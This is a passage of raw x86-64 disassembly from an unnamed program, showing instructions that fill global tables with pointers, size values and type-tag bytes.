  40cb63:	48 8b 0d 3e 27 01 00 	mov    0x1273e(%rip),%rcx        # 0x41f2a8
  40cb6a:	48 8d 15 71 28 00 00 	lea    0x2871(%rip),%rdx        # 0x40f3e2
  40cb71:	48 89 05 80 da 00 00 	mov    %rax,0xda80(%rip)        # 0x41a5f8
  40cb78:	e8 5b 83 ff ff       	call   0x404ed8
  40cb7d:	48 8b 0d 24 27 01 00 	mov    0x12724(%rip),%rcx        # 0x41f2a8
  40cb84:	48 8d 15 5d 28 00 00 	lea    0x285d(%rip),%rdx        # 0x40f3e8
  40cb8b:	48 89 05 5e da 00 00 	mov    %rax,0xda5e(%rip)        # 0x41a5f0
  40cb92:	e8 41 83 ff ff       	call   0x404ed8
  40cb97:	48 8b 0d 0a 27 01 00 	mov    0x1270a(%rip),%rcx        # 0x41f2a8
  40cb9e:	48 8d 15 4f 28 00 00 	lea    0x284f(%rip),%rdx        # 0x40f3f4
  40cba5:	48 89 05 3c da 00 00 	mov    %rax,0xda3c(%rip)        # 0x41a5e8
  40cbac:	e8 27 83 ff ff       	call   0x404ed8
  40cbb1:	48 8d 0d f8 27 01 00 	lea    0x127f8(%rip),%rcx        # 0x41f3b0
  40cbb8:	48 89 3d 09 28 01 00 	mov    %rdi,0x12809(%rip)        # 0x41f3c8
  40cbbf:	48 89 05 1a da 00 00 	mov    %rax,0xda1a(%rip)        # 0x41a5e0
  40cbc6:	48 8d 05 83 27 01 00 	lea    0x12783(%rip),%rax        # 0x41f350
  40cbcd:	48 89 0d ec 26 01 00 	mov    %rcx,0x126ec(%rip)        # 0x41f2c0
  40cbd4:	48 8d 0d 05 28 01 00 	lea    0x12805(%rip),%rcx        # 0x41f3e0
  40cbdb:	48 89 05 8e 28 01 00 	mov    %rax,0x1288e(%rip)        # 0x41f470
  40cbe2:	48 8d 05 f7 26 01 00 	lea    0x126f7(%rip),%rax        # 0x41f2e0
  40cbe9:	48 89 0d d8 26 01 00 	mov    %rcx,0x126d8(%rip)        # 0x41f2c8
  40cbf0:	48 8d 0d c9 26 01 00 	lea    0x126c9(%rip),%rcx        # 0x41f2c0
  40cbf7:	48 89 0d aa 27 01 00 	mov    %rcx,0x127aa(%rip)        # 0x41f3a8
  40cbfe:	48 8d 0d 7b 27 01 00 	lea    0x1277b(%rip),%rcx        # 0x41f380
  40cc05:	48 89 05 54 27 01 00 	mov    %rax,0x12754(%rip)        # 0x41f360
  40cc0c:	48 89 05 0d 28 01 00 	mov    %rax,0x1280d(%rip)        # 0x41f420
  40cc13:	48 8d 05 03 28 00 00 	lea    0x2803(%rip),%rax        # 0x40f41d
  40cc1a:	48 89 0d d7 26 01 00 	mov    %rcx,0x126d7(%rip)        # 0x41f2f8
  40cc21:	48 8d 0d df 27 00 00 	lea    0x27df(%rip),%rcx        # 0x40f407
  40cc28:	48 89 05 f9 27 01 00 	mov    %rax,0x127f9(%rip)        # 0x41f428
  40cc2f:	48 8d 05 0a 28 01 00 	lea    0x1280a(%rip),%rax        # 0x41f440
  40cc36:	48 89 0d 2b 27 01 00 	mov    %rcx,0x1272b(%rip)        # 0x41f368
  40cc3d:	48 8d 0d cc 27 01 00 	lea    0x127cc(%rip),%rcx        # 0x41f410
  40cc44:	48 89 05 35 28 01 00 	mov    %rax,0x12835(%rip)        # 0x41f480
  40cc4b:	48 8d 05 23 26 00 00 	lea    0x2623(%rip),%rax        # 0x40f275
  40cc52:	48 89 35 9f 27 01 00 	mov    %rsi,0x1279f(%rip)        # 0x41f3f8
  40cc59:	48 89 0d 18 28 01 00 	mov    %rcx,0x12818(%rip)        # 0x41f478
  40cc60:	48 8d 0d 39 2e 01 00 	lea    0x12e39(%rip),%rcx        # 0x41faa0
  40cc67:	48 c7 05 2e 28 01 00 	movq   $0x28,0x1282e(%rip)        # 0x41f4a0
  40cc6e:	28 00 00 00 
  40cc72:	c6 05 2f 28 01 00 12 	movb   $0x12,0x1282f(%rip)        # 0x41f4a8
  40cc79:	48 c7 05 2c 28 01 00 	movq   $0x0,0x1282c(%rip)        # 0x41f4b0
  40cc80:	00 00 00 00 
  40cc84:	48 c7 05 51 26 01 00 	movq   $0x10,0x12651(%rip)        # 0x41f2e0
  40cc8b:	10 00 00 00 
  40cc8f:	c6 05 52 26 01 00 12 	movb   $0x12,0x12652(%rip)        # 0x41f2e8
  40cc96:	48 c7 05 4f 26 01 00 	movq   $0x0,0x1264f(%rip)        # 0x41f2f0
  40cc9d:	00 00 00 00 
  40cca1:	c6 05 08 27 01 00 01 	movb   $0x1,0x12708(%rip)        # 0x41f3b0
  40cca8:	48 c7 05 05 27 01 00 	movq   $0x0,0x12705(%rip)        # 0x41f3b8
  40ccaf:	00 00 00 00 
  40ccb3:	4c 89 3d 06 27 01 00 	mov    %r15,0x12706(%rip)        # 0x41f3c0
  40ccba:	c6 05 1f 27 01 00 01 	movb   $0x1,0x1271f(%rip)        # 0x41f3e0
  40ccc1:	48 c7 05 1c 27 01 00 	movq   $0x8,0x1271c(%rip)        # 0x41f3e8
  40ccc8:	08 00 00 00 
  40cccc:	4c 89 35 1d 27 01 00 	mov    %r14,0x1271d(%rip)        # 0x41f3f0
  40ccd3:	48 c7 05 c2 26 01 00 	movq   $0x2,0x126c2(%rip)        # 0x41f3a0
  40ccda:	02 00 00 00 
  40ccde:	c6 05 9b 26 01 00 02 	movb   $0x2,0x1269b(%rip)        # 0x41f380
  40cce5:	c6 05 64 26 01 00 01 	movb   $0x1,0x12664(%rip)        # 0x41f350
  40ccec:	48 c7 05 61 26 01 00 	movq   $0x0,0x12661(%rip)        # 0x41f358
  40ccf3:	00 00 00 00 
  40ccf7:	c6 05 12 27 01 00 01 	movb   $0x1,0x12712(%rip)        # 0x41f410
  40ccfe:	48 c7 05 0f 27 01 00 	movq   $0x10,0x1270f(%rip)        # 0x41f418
  40cd05:	10 00 00 00 
  40cd09:	c6 05 30 27 01 00 01 	movb   $0x1,0x12730(%rip)        # 0x41f440
  40cd10:	48 8b 15 19 a8 00 00 	mov    0xa819(%rip),%rdx        # 0x417530
  40cd17:	48 89 05 3a 27 01 00 	mov    %rax,0x1273a(%rip)        # 0x41f458
  40cd1e:	48 8d 05 4b 27 01 00 	lea    0x1274b(%rip),%rax        # 0x41f470
  40cd25:	48 89 05 1c 26 01 00 	mov    %rax,0x1261c(%rip)        # 0x41f348
  40cd2c:	48 8d 05 ed 25 01 00 	lea    0x125ed(%rip),%rax        # 0x41f320
  40cd33:	48 89 05 7e 27 01 00 	mov    %rax,0x1277e(%rip)        # 0x41f4b8
  40cd3a:	48 8b 05 8f a9 00 00 	mov    0xa98f(%rip),%rax        # 0x4176d0
  40cd41:	48 c7 05 fc 26 01 00 	movq   $0x20,0x126fc(%rip)        # 0x41f448
  40cd48:	20 00 00 00 
  40cd4c:	48 89 1d fd 26 01 00 	mov    %rbx,0x126fd(%rip)        # 0x41f450
  40cd53:	48 c7 05 e2 25 01 00 	movq   $0x3,0x125e2(%rip)        # 0x41f340
  40cd5a:	03 00 00 00 
  40cd5e:	48 89 50 28          	mov    %rdx,0x28(%rax)
  40cd62:	48 c7 00 08 00 00 00 	movq   $0x8,(%rax)
  40cd69:	c6 40 08 18          	movb   $0x18,0x8(%rax)
  40cd6d:	48 89 58 10          	mov    %rbx,0x10(%rax)
  40cd71:	c6 40 09 02          	movb   $0x2,0x9(%rax)
  40cd75:	48 8d 05 c4 32 01 00 	lea    0x132c4(%rip),%rax        # 0x420040
  40cd7c:	48 89 05 ad 27 01 00 	mov    %rax,0x127ad(%rip)        # 0x41f530
  40cd83:	48 8b 05 96 a7 00 00 	mov    0xa796(%rip),%rax        # 0x417520
  40cd8a:	c6 05 8f 25 01 00 02 	movb   $0x2,0x1258f(%rip)        # 0x41f320
  40cd91:	48 c7 05 c4 31 01 00 	movq   $0x8,0x131c4(%rip)        # 0x41ff60
  40cd98:	08 00 00 00 
  40cd9c:	c6 05 c5 31 01 00 12 	movb   $0x12,0x131c5(%rip)        # 0x41ff68
  40cda3:	48 89 05 9e 27 01 00 	mov    %rax,0x1279e(%rip)        # 0x41f548
  40cdaa:	48 8d 05 6f 27 01 00 	lea    0x1276f(%rip),%rax        # 0x41f520
  40cdb1:	48 89 05 38 27 01 00 	mov    %rax,0x12738(%rip)        # 0x41f4f0
  40cdb8:	48 8d 05 21 27 01 00 	lea    0x12721(%rip),%rax        # 0x41f4e0
  40cdbf:	48 89 05 b2 31 01 00 	mov    %rax,0x131b2(%rip)        # 0x41ff78
  40cdc6:	48 8d 05 03 28 01 00 	lea    0x12803(%rip),%rax        # 0x41f5d0
  40cdcd:	48 89 05 ec 28 01 00 	mov    %rax,0x128ec(%rip)        # 0x41f6c0
  40cdd4:	48 8d 05 85 27 01 00 	lea    0x12785(%rip),%rax        # 0x41f560
  40cddb:	48 c7 05 8a 31 01 00 	movq   $0x0,0x1318a(%rip)        # 0x41ff70
  40cde2:	00 00 00 00 
  40cde6:	48 c7 05 2f 27 01 00 	movq   $0x8,0x1272f(%rip)        # 0x41f520
  40cded:	08 00 00 00 
  40cdf1:	c6 05 30 27 01 00 18 	movb   $0x18,0x12730(%rip)        # 0x41f528
  40cdf8:	c6 05 e1 26 01 00 01 	movb   $0x1,0x126e1(%rip)        # 0x41f4e0
  40cdff:	48 c7 05 de 26 01 00 	movq   $0x0,0x126de(%rip)        # 0x41f4e8
  40ce06:	00 00 00 00 
  40ce0a:	4c 89 25 e7 26 01 00 	mov    %r12,0x126e7(%rip)        # 0x41f4f8
  40ce11:	48 c7 05 04 31 01 00 	movq   $0x28,0x13104(%rip)        # 0x41ff20
  40ce18:	28 00 00 00 
  40ce1c:	c6 05 05 31 01 00 12 	movb   $0x12,0x13105(%rip)        # 0x41ff28
  40ce23:	48 c7 05 02 31 01 00 	movq   $0x0,0x13102(%rip)        # 0x41ff30
  40ce2a:	00 00 00 00 
  40ce2e:	c6 05 9b 27 01 00 01 	movb   $0x1,0x1279b(%rip)        # 0x41f5d0
  40ce35:	48 c7 05 98 27 01 00 	movq   $0x0,0x12798(%rip)        # 0x41f5d8
  40ce3c:	00 00 00 00 
  40ce40:	48 89 05 99 27 01 00 	mov    %rax,0x12799(%rip)        # 0x41f5e0
  40ce47:	48 8d 05 b2 27 01 00 	lea    0x127b2(%rip),%rax        # 0x41f600
  40ce4e:	48 89 05 73 28 01 00 	mov    %rax,0x12873(%rip)        # 0x41f6c8
  40ce55:	48 8d 05 da 25 00 00 	lea    0x25da(%rip),%rax        # 0x40f436
  40ce5c:	48 89 05 b5 27 01 00 	mov    %rax,0x127b5(%rip)        # 0x41f618
  40ce63:	48 8d 05 c6 27 01 00 	lea    0x127c6(%rip),%rax        # 0x41f630
  40ce6a:	48 89 05 5f 28 01 00 	mov    %rax,0x1285f(%rip)        # 0x41f6d0
  40ce71:	48 8d 05 c3 25 00 00 	lea    0x25c3(%rip),%rax        # 0x40f43b
  40ce78:	48 89 05 c9 27 01 00 	mov    %rax,0x127c9(%rip)        # 0x41f648
  40ce7f:	48 8d 05 da 27 01 00 	lea    0x127da(%rip),%rax        # 0x41f660
  40ce86:	48 89 05 4b 28 01 00 	mov    %rax,0x1284b(%rip)        # 0x41f6d8
  40ce8d:	48 8d 05 ac 25 00 00 	lea    0x25ac(%rip),%rax        # 0x40f440
  40ce94:	48 89 05 dd 27 01 00 	mov    %rax,0x127dd(%rip)        # 0x41f678
  40ce9b:	48 8d 05 ee 27 01 00 	lea    0x127ee(%rip),%rax        # 0x41f690
  40cea2:	48 89 05 37 28 01 00 	mov    %rax,0x12837(%rip)        # 0x41f6e0
  40cea9:	48 8d 05 96 25 00 00 	lea    0x2596(%rip),%rax        # 0x40f446
  40ceb0:	48 89 05 f1 27 01 00 	mov    %rax,0x127f1(%rip)        # 0x41f6a8
  40ceb7:	48 8d 05 02 28 01 00 	lea    0x12802(%rip),%rax        # 0x41f6c0
  40cebe:	48 89 05 03 27 01 00 	mov    %rax,0x12703(%rip)        # 0x41f5c8
  40cec5:	48 8d 05 d4 26 01 00 	lea    0x126d4(%rip),%rax        # 0x41f5a0
  40cecc:	48 89 05 65 30 01 00 	mov    %rax,0x13065(%rip)        # 0x41ff38
  40ced3:	48 8d 05 d6 2a 01 00 	lea    0x12ad6(%rip),%rax        # 0x41f9b0
  40ceda:	48 89 05 df 2c 01 00 	mov    %rax,0x12cdf(%rip)        # 0x41fbc0
  40cee1:	48 8d 05 f8 2a 01 00 	lea    0x12af8(%rip),%rax        # 0x41f9e0
  40cee8:	48 89 3d d9 2a 01 00 	mov    %rdi,0x12ad9(%rip)        # 0x41f9c8
  40ceef:	48 89 05 d2 2c 01 00 	mov    %rax,0x12cd2(%rip)        # 0x41fbc8
  40cef6:	48 8d 05 c3 2c 01 00 	lea    0x12cc3(%rip),%rax        # 0x41fbc0
  40cefd:	4c 89 25 e4 26 01 00 	mov    %r12,0x126e4(%rip)        # 0x41f5e8
  40cf04:	c6 05 f5 26 01 00 01 	movb   $0x1,0x126f5(%rip)        # 0x41f600
  40cf0b:	48 c7 05 f2 26 01 00 	movq   $0x8,0x126f2(%rip)        # 0x41f608
  40cf12:	08 00 00 00 
  40cf16:	4c 89 2d f3 26 01 00 	mov    %r13,0x126f3(%rip)        # 0x41f610
  40cf1d:	c6 05 0c 27 01 00 01 	movb   $0x1,0x1270c(%rip)        # 0x41f630
  40cf24:	48 c7 05 09 27 01 00 	movq   $0x10,0x12709(%rip)        # 0x41f638
  40cf2b:	10 00 00 00 
  40cf2f:	4c 89 2d 0a 27 01 00 	mov    %r13,0x1270a(%rip)        # 0x41f640
  40cf36:	c6 05 23 27 01 00 01 	movb   $0x1,0x12723(%rip)        # 0x41f660
  40cf3d:	48 c7 05 20 27 01 00 	movq   $0x18,0x12720(%rip)        # 0x41f668
  40cf44:	18 00 00 00 
  40cf48:	4c 89 2d 21 27 01 00 	mov    %r13,0x12721(%rip)        # 0x41f670
  40cf4f:	c6 05 3a 27 01 00 01 	movb   $0x1,0x1273a(%rip)        # 0x41f690
  40cf56:	48 c7 05 37 27 01 00 	movq   $0x20,0x12737(%rip)        # 0x41f698
  40cf5d:	20 00 00 00 
  40cf61:	4c 89 2d 38 27 01 00 	mov    %r13,0x12738(%rip)        # 0x41f6a0
  40cf68:	48 c7 05 4d 26 01 00 	movq   $0x5,0x1264d(%rip)        # 0x41f5c0
  40cf6f:	05 00 00 00 
  40cf73:	c6 05 26 26 01 00 02 	movb   $0x2,0x12626(%rip)        # 0x41f5a0
  40cf7a:	c6 05 2f 2a 01 00 01 	movb   $0x1,0x12a2f(%rip)        # 0x41f9b0
  40cf81:	48 c7 05 2c 2a 01 00 	movq   $0x0,0x12a2c(%rip)        # 0x41f9b8
  40cf88:	00 00 00 00 
  40cf8c:	4c 89 3d 2d 2a 01 00 	mov    %r15,0x12a2d(%rip)        # 0x41f9c0
  40cf93:	c6 05 46 2a 01 00 01 	movb   $0x1,0x12a46(%rip)        # 0x41f9e0
  40cf9a:	48 8b 15 1f a5 00 00 	mov    0xa51f(%rip),%rdx        # 0x4174c0
  40cfa1:	48 89 0d 98 28 01 00 	mov    %rcx,0x12898(%rip)        # 0x41f840
  40cfa8:	48 8d 0d 51 28 01 00 	lea    0x12851(%rip),%rcx        # 0x41f800
  40cfaf:	48 89 0d fa 2a 01 00 	mov    %rcx,0x12afa(%rip)        # 0x41fab0
  40cfb6:	48 8d 0d 8e 24 00 00 	lea    0x248e(%rip),%rcx        # 0x40f44b
  40cfbd:	48 89 0d f4 2a 01 00 	mov    %rcx,0x12af4(%rip)        # 0x41fab8
  40cfc4:	48 8d 0d 05 2b 01 00 	lea    0x12b05(%rip),%rcx        # 0x41fad0
  40cfcb:	48 89 0d 76 28 01 00 	mov    %rcx,0x12876(%rip)        # 0x41f848
  40cfd2:	48 8d 0d e7 27 01 00 	lea    0x127e7(%rip),%rcx        # 0x41f7c0
  40cfd9:	48 89 0d 00 2b 01 00 	mov    %rcx,0x12b00(%rip)        # 0x41fae0
  40cfe0:	48 8d 0d 6d 24 00 00 	lea    0x246d(%rip),%rcx        # 0x40f454
  40cfe7:	48 89 05 ba 29 01 00 	mov    %rax,0x129ba(%rip)        # 0x41f9a8
  40cfee:	48 8d 05 4b 2a 01 00 	lea    0x12a4b(%rip),%rax        # 0x41fa40
  40cff5:	48 89 0d ec 2a 01 00 	mov    %rcx,0x12aec(%rip)        # 0x41fae8
  40cffc:	48 8d 0d 3d 28 01 00 	lea    0x1283d(%rip),%rcx        # 0x41f840
  40d003:	48 89 05 96 28 01 00 	mov    %rax,0x12896(%rip)        # 0x41f8a0
  40d00a:	48 8d 05 4f 28 01 00 	lea    0x1284f(%rip),%rax        # 0x41f860
  40d011:	48 89 15 d0 27 01 00 	mov    %rdx,0x127d0(%rip)        # 0x41f7e8
  40d018:	48 8d 15 21 27 01 00 	lea    0x12721(%rip),%rdx        # 0x41f740
  40d01f:	48 89 0d 72 2a 01 00 	mov    %rcx,0x12a72(%rip)        # 0x41fa98
  40d026:	48 8d 0d 43 2a 01 00 	lea    0x12a43(%rip),%rcx        # 0x41fa70
  40d02d:	48 89 35 c4 29 01 00 	mov    %rsi,0x129c4(%rip)        # 0x41f9f8
  40d034:	48 89 05 95 27 01 00 	mov    %rax,0x12795(%rip)        # 0x41f7d0
  40d03b:	48 89 0d 36 28 01 00 	mov    %rcx,0x12836(%rip)        # 0x41f878
  40d042:	48 8d 0d b7 2a 01 00 	lea    0x12ab7(%rip),%rcx        # 0x41fb00
  40d049:	48 c7 05 94 29 01 00 	movq   $0x8,0x12994(%rip)        # 0x41f9e8
  40d050:	08 00 00 00 
  40d054:	4c 89 35 95 29 01 00 	mov    %r14,0x12995(%rip)        # 0x41f9f0
  40d05b:	48 c7 05 3a 29 01 00 	movq   $0x2,0x1293a(%rip)        # 0x41f9a0
  40d062:	02 00 00 00 
  40d066:	c6 05 13 29 01 00 02 	movb   $0x2,0x12913(%rip)        # 0x41f980
  40d06d:	48 c7 05 48 28 01 00 	movq   $0x38,0x12848(%rip)        # 0x41f8c0
  40d074:	38 00 00 00 
  40d078:	c6 05 49 28 01 00 11 	movb   $0x11,0x12849(%rip)        # 0x41f8c8
  40d07f:	48 89 2d 4a 28 01 00 	mov    %rbp,0x1284a(%rip)        # 0x41f8d0
  40d086:	48 c7 05 cf 27 01 00 	movq   $0x18,0x127cf(%rip)        # 0x41f860
  40d08d:	18 00 00 00 
  40d091:	c6 05 d0 27 01 00 12 	movb   $0x12,0x127d0(%rip)        # 0x41f868
  40d098:	48 c7 05 cd 27 01 00 	movq   $0x0,0x127cd(%rip)        # 0x41f870
  40d09f:	00 00 00 00 
  40d0a3:	c6 05 f6 29 01 00 01 	movb   $0x1,0x129f6(%rip)        # 0x41faa0
  40d0aa:	48 c7 05 f3 29 01 00 	movq   $0x0,0x129f3(%rip)        # 0x41faa8
  40d0b1:	00 00 00 00 
  40d0b5:	48 c7 05 00 27 01 00 	movq   $0x8,0x12700(%rip)        # 0x41f7c0
  40d0bc:	08 00 00 00 
  40d0c0:	c6 05 01 27 01 00 16 	movb   $0x16,0x12701(%rip)        # 0x41f7c8
  40d0c7:	c6 05 02 2a 01 00 01 	movb   $0x1,0x12a02(%rip)        # 0x41fad0
  40d0ce:	48 c7 05 ff 29 01 00 	movq   $0x10,0x129ff(%rip)        # 0x41fad8
  40d0d5:	10 00 00 00 
  40d0d9:	48 c7 05 ac 29 01 00 	movq   $0x2,0x129ac(%rip)        # 0x41fa90
  40d0e0:	02 00 00 00 
  40d0e4:	c6 05 85 29 01 00 02 	movb   $0x2,0x12985(%rip)        # 0x41fa70
  40d0eb:	c6 05 4e 29 01 00 01 	movb   $0x1,0x1294e(%rip)        # 0x41fa40
  40d0f2:	48 89 15 47 2a 01 00 	mov    %rdx,0x12a47(%rip)        # 0x41fb40
  40d0f9:	48 8d 15 60 2a 01 00 	lea    0x12a60(%rip),%rdx        # 0x41fb60
  40d100:	48 89 0d a1 27 01 00 	mov    %rcx,0x127a1(%rip)        # 0x41f8a8
  40d107:	48 8d 0d 72 26 01 00 	lea    0x12672(%rip),%rcx        # 0x41f780
  40d10e:	48 89 15 a3 27 01 00 	mov    %rdx,0x127a3(%rip)        # 0x41f8b8
  40d115:	48 8d 15 84 27 01 00 	lea    0x12784(%rip),%rdx        # 0x41f8a0
  40d11c:	48 89 0d ed 29 01 00 	mov    %rcx,0x129ed(%rip)        # 0x41fb10
  40d123:	48 8d 0d 39 23 00 00 	lea    0x2339(%rip),%rcx        # 0x40f463
  40d12a:	48 89 15 07 29 01 00 	mov    %rdx,0x12907(%rip)        # 0x41fa38
  40d131:	48 8d 15 88 27 01 00 	lea    0x12788(%rip),%rdx        # 0x41f8c0
  40d138:	48 89 0d d9 29 01 00 	mov    %rcx,0x129d9(%rip)        # 0x41fb18
  40d13f:	48 8d 0d ea 29 01 00 	lea    0x129ea(%rip),%rcx        # 0x41fb30
  40d146:	48 89 15 c3 25 01 00 	mov    %rdx,0x125c3(%rip)        # 0x41f710
  40d14d:	48 8d 15 ac 25 01 00 	lea    0x125ac(%rip),%rdx        # 0x41f700
  40d154:	48 89 0d 55 27 01 00 	mov    %rcx,0x12755(%rip)        # 0x41f8b0
  40d15b:	48 8d 0d 0a 23 00 00 	lea    0x230a(%rip),%rcx        # 0x40f46c
  40d162:	48 89 15 47 2e 01 00 	mov    %rdx,0x12e47(%rip)        # 0x41ffb0
  40d169:	48 8b 15 40 a3 00 00 	mov    0xa340(%rip),%rdx        # 0x4174b0
  40d170:	48 89 0d d1 29 01 00 	mov    %rcx,0x129d1(%rip)        # 0x41fb48
  40d177:	48 8d 0d f4 22 00 00 	lea    0x22f4(%rip),%rcx        # 0x40f472
  40d17e:	48 89 0d f3 29 01 00 	mov    %rcx,0x129f3(%rip)        # 0x41fb78
  40d185:	48 8d 0d 84 28 01 00 	lea    0x12884(%rip),%rcx        # 0x41fa10
  40d18c:	48 89 05 bd 28 01 00 	mov    %rax,0x128bd(%rip)        # 0x41fa50
  40d193:	48 8d 05 bf 22 00 00 	lea    0x22bf(%rip),%rax        # 0x40f459
  40d19a:	48 89 0d 37 27 01 00 	mov    %rcx,0x12737(%rip)        # 0x41f8d8
  40d1a1:	48 8d 0d e8 29 01 00 	lea    0x129e8(%rip),%rcx        # 0x41fb90
  40d1a8:	48 89 05 a9 28 01 00 	mov    %rax,0x128a9(%rip)        # 0x41fa58
  40d1af:	48 89 0d 62 25 01 00 	mov    %rcx,0x12562(%rip)        # 0x41f718
  40d1b6:	48 8d 0d 23 2a 01 00 	lea    0x12a23(%rip),%rcx        # 0x41fbe0
  40d1bd:	48 c7 05 80 28 01 00 	movq   $0x8,0x12880(%rip)        # 0x41fa48
  40d1c4:	08 00 00 00 
  40d1c8:	c6 05 31 29 01 00 01 	movb   $0x1,0x12931(%rip)        # 0x41fb00
  40d1cf:	48 c7 05 2e 29 01 00 	movq   $0x20,0x1292e(%rip)        # 0x41fb08
  40d1d6:	20 00 00 00 
  40d1da:	c6 05 4f 29 01 00 01 	movb   $0x1,0x1294f(%rip)        # 0x41fb30
  40d1e1:	48 c7 05 4c 29 01 00 	movq   $0x28,0x1294c(%rip)        # 0x41fb38
  40d1e8:	28 00 00 00 
  40d1ec:	c6 05 6d 29 01 00 01 	movb   $0x1,0x1296d(%rip)        # 0x41fb60
  40d1f3:	48 c7 05 6a 29 01 00 	movq   $0x30,0x1296a(%rip)        # 0x41fb68
  40d1fa:	30 00 00 00 
  40d1fe:	48 89 1d 6b 29 01 00 	mov    %rbx,0x1296b(%rip)        # 0x41fb70
  40d205:	48 c7 05 20 28 01 00 	movq   $0x4,0x12820(%rip)        # 0x41fa30
  40d20c:	04 00 00 00 
  40d210:	c6 05 f9 27 01 00 02 	movb   $0x2,0x127f9(%rip)        # 0x41fa10
  40d217:	48 c7 05 de 24 01 00 	movq   $0x38,0x124de(%rip)        # 0x41f700
  40d21e:	38 00 00 00 
  40d222:	c6 05 df 24 01 00 11 	movb   $0x11,0x124df(%rip)        # 0x41f708
  40d229:	48 c7 05 7c 29 01 00 	movq   $0x0,0x1297c(%rip)        # 0x41fbb0
  40d230:	00 00 00 00 
  40d234:	c6 05 55 29 01 00 02 	movb   $0x2,0x12955(%rip)        # 0x41fb90
  40d23b:	48 c7 05 5a 2d 01 00 	movq   $0x8,0x12d5a(%rip)        # 0x41ffa0
  40d242:	08 00 00 00 
  40d246:	c6 05 5b 2d 01 00 16 	movb   $0x16,0x12d5b(%rip)        # 0x41ffa8
  40d24d:	48 89 15 74 2d 01 00 	mov    %rdx,0x12d74(%rip)        # 0x41ffc8
  40d254:	48 8d 15 27 22 00 00 	lea    0x2227(%rip),%rdx        # 0x40f482
  40d25b:	48 89 0d ce 29 01 00 	mov    %rcx,0x129ce(%rip)        # 0x41fc30
  40d262:	48 8d 0d b7 29 01 00 	lea    0x129b7(%rip),%rcx        # 0x41fc20
  40d269:	48 89 15 c8 29 01 00 	mov    %rdx,0x129c8(%rip)        # 0x41fc38
  40d270:	48 8d 15 b9 2a 01 00 	lea    0x12ab9(%rip),%rdx        # 0x41fd30
  40d277:	48 89 0d 7a 2d 01 00 	mov    %rcx,0x12d7a(%rip)        # 0x41fff8
  40d27e:	48 8d 0d 0b 2b 01 00 	lea    0x12b0b(%rip),%rcx        # 0x41fd90
  40d285:	48 89 15 94 2b 01 00 	mov    %rdx,0x12b94(%rip)        # 0x41fe20
  40d28c:	48 8d 15 2d 2b 01 00 	lea    0x12b2d(%rip),%rdx        # 0x41fdc0
  40d293:	48 89 0d 06 2a 01 00 	mov    %rcx,0x12a06(%rip)        # 0x41fca0
  40d29a:	48 8d 0d ff 29 01 00 	lea    0x129ff(%rip),%rcx        # 0x41fca0
  40d2a1:	48 89 15 00 2a 01 00 	mov    %rdx,0x12a00(%rip)        # 0x41fca8
  40d2a8:	48 8d 15 b1 2a 01 00 	lea    0x12ab1(%rip),%rdx        # 0x41fd60
  40d2af:	48 89 3d f2 2a 01 00 	mov    %rdi,0x12af2(%rip)        # 0x41fda8
  40d2b6:	48 89 35 1b 2b 01 00 	mov    %rsi,0x12b1b(%rip)        # 0x41fdd8
  40d2bd:	48 89 0d c4 2a 01 00 	mov    %rcx,0x12ac4(%rip)        # 0x41fd88
  40d2c4:	48 8d 0d f5 29 01 00 	lea    0x129f5(%rip),%rcx        # 0x41fcc0
  40d2cb:	48 89 15 06 2a 01 00 	mov    %rdx,0x12a06(%rip)        # 0x41fcd8
  40d2d2:	48 c7 05 03 2d 01 00 	movq   $0x8,0x12d03(%rip)        # 0x41ffe0
  40d2d9:	08 00 00 00 
  40d2dd:	c6 05 04 2d 01 00 12 	movb   $0x12,0x12d04(%rip)        # 0x41ffe8
  40d2e4:	48 c7 05 01 2d 01 00 	movq   $0x0,0x12d01(%rip)        # 0x41fff0
  40d2eb:	00 00 00 00 
  40d2ef:	c6 05 f3 2c 01 00 03 	movb   $0x3,0x12cf3(%rip)        # 0x41ffe9
  40d2f6:	c6 05 23 29 01 00 01 	movb   $0x1,0x12923(%rip)        # 0x41fc20
  40d2fd:	48 c7 05 20 29 01 00 	movq   $0x0,0x12920(%rip)        # 0x41fc28
  40d304:	00 00 00 00 
  40d308:	48 c7 05 2d 2b 01 00 	movq   $0x10,0x12b2d(%rip)        # 0x41fe40
  40d30f:	10 00 00 00 
  40d313:	c6 05 2e 2b 01 00 12 	movb   $0x12,0x12b2e(%rip)        # 0x41fe48
  40d31a:	48 c7 05 2b 2b 01 00 	movq   $0x0,0x12b2b(%rip)        # 0x41fe50
  40d321:	00 00 00 00 
  40d325:	c6 05 1d 2b 01 00 02 	movb   $0x2,0x12b1d(%rip)        # 0x41fe49
  40d32c:	48 c7 05 89 29 01 00 	movq   $0x10,0x12989(%rip)        # 0x41fcc0
  40d333:	10 00 00 00 
  40d337:	c6 05 8a 29 01 00 12 	movb   $0x12,0x1298a(%rip)        # 0x41fcc8
  40d33e:	48 c7 05 87 29 01 00 	movq   $0x0,0x12987(%rip)        # 0x41fcd0
  40d345:	00 00 00 00 
  40d349:	c6 05 79 29 01 00 03 	movb   $0x3,0x12979(%rip)        # 0x41fcc9
  40d350:	c6 05 39 2a 01 00 01 	movb   $0x1,0x12a39(%rip)        # 0x41fd90
  40d357:	48 c7 05 36 2a 01 00 	movq   $0x0,0x12a36(%rip)        # 0x41fd98
  40d35e:	00 00 00 00 
  40d362:	4c 89 2d 37 2a 01 00 	mov    %r13,0x12a37(%rip)        # 0x41fda0
  40d369:	c6 05 50 2a 01 00 01 	movb   $0x1,0x12a50(%rip)        # 0x41fdc0
  40d370:	48 c7 05 4d 2a 01 00 	movq   $0x8,0x12a4d(%rip)        # 0x41fdc8
  40d377:	08 00 00 00 
  40d37b:	4c 89 2d 4e 2a 01 00 	mov    %r13,0x12a4e(%rip)        # 0x41fdd0
  40d382:	48 c7 05 f3 29 01 00 	movq   $0x2,0x129f3(%rip)        # 0x41fd80
  40d389:	02 00 00 00 
  40d38d:	c6 05 cc 29 01 00 02 	movb   $0x2,0x129cc(%rip)        # 0x41fd60
  40d394:	48 c7 05 c1 28 01 00 	movq   $0x8,0x128c1(%rip)        # 0x41fc60
  40d39b:	08 00 00 00 
  40d39f:	48 8b 15 4a a1 00 00 	mov    0xa14a(%rip),%rdx        # 0x4174f0
  40d3a6:	48 89 0d c3 28 01 00 	mov    %rcx,0x128c3(%rip)        # 0x41fc70
  40d3ad:	48 8d 0d 3c 2a 01 00 	lea    0x12a3c(%rip),%rcx        # 0x41fdf0
  40d3b4:	48 89 0d 6d 2a 01 00 	mov    %rcx,0x12a6d(%rip)        # 0x41fe28
  40d3bb:	48 8d 0d 5e 2a 01 00 	lea    0x12a5e(%rip),%rcx        # 0x41fe20
